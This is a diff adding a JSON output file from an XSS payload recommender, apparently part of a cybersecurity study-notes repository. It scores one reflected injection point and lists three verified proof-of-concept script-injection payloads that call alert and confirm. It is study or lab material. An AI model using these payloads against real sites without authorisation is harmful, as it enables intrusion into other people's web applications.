@@ -1,0 +1,106 @@
+{
+  "generated_by": "recommend_payload.py",
+  "generated_at": "2026-10-17T15:13:41.774313",
+  "source_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/Skills/log/20261017-151341-xss_reflection_analysis.json",
+  "source_keyword_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/Skills/log/20261017-151341-xss_keyword_analysis.json",
+  "reflections": [
+    {
+      "reflection_index": 1,
+      "context": "html",
+      "quote": "",
+      "scores": {
+        "'": 100,
+        "\"": 100,
+        ">": 100,
+        "<": 100,
+        "/": 100,
+        "\\": 100
+      },
+      "keyword_mask": {
+        "parentheses": true,
+        "backtick": true,
+        "alert": true,
+        "confirm": true,
+        "prompt": true,
+        "script_tag": true,
+        "javascript_proto": true,
+        "onerror": true,
+        "img_tag": true,
+        "entity_lt": true,
+        "srcdoc": true,
+        "onload": true,
+        "ontoggle": true,
+        "autofocus": true,
+        "onfocus": true,
+        "print": true,
+        "svg_tag": true,
+        "details_tag": true,
+        "body_tag": true,
+        "iframe_tag": true,
+        "call_alert": true,
+        "call_confirm": true,
+        "call_prompt": true,
+        "call_print": true,
+        "tick_alert": true,
+        "tick_confirm": true,
+        "tick_prompt": true,
+        "pair_img_onerror": true,
+        "pair_svg_onload": true,
+        "pair_details_ontoggle": true,
+        "pair_body_onload": true,
+        "pair_iframe_onload": true,
+        "close_script": true,
+        "close_title": true,
+        "close_noscript": true,
+        "close_style": true,
+        "close_iframe": true,
+        "js_break_squote": true,
+        "js_break_dquote": true,
+        "proto_href": true,
+        "case_script": true,
+        "case_onload": true,
+        "case_proto": true,
+        "newline": true,
+        "comment_close": true,
+        "interp": true
+      },
+      "candidates": [
+        {
+          "payload": "<script vvm{id}>alert(1)</script>",
+          "technique": "script injection",
+          "case_ref": "body_direct",
+          "efficiency": 100
+        },
+        {
+          "payload": "<script vvm{id}>alert`1`</script>",
+          "technique": "script injection",
+          "case_ref": "body_direct",
+          "efficiency": 100
+        },
+        {
+          "payload": "<script vvm{id}>confirm(1)</script>",
+          "technique": "script injection",
+          "case_ref": "body_direct",
+          "efficiency": 100
+        }
+      ],
+      "verification": [
+        {
+          "payload": "<script vvmegcelr>alert(1)</script>",
+          "confidence": "V",
+          "evidence": "marker inside <script> element"
+        },
+        {
+          "payload": "<script vvmwqofcx>alert`1`</script>",
+          "confidence": "V",
+          "evidence": "marker inside <script> element"
+        },
+        {
+          "payload": "<script vvmuprvfs>confirm(1)</script>",
+          "confidence": "V",
+          "evidence": "marker inside <script> element"
+        }
+      ]
+    }
+  ]
+}
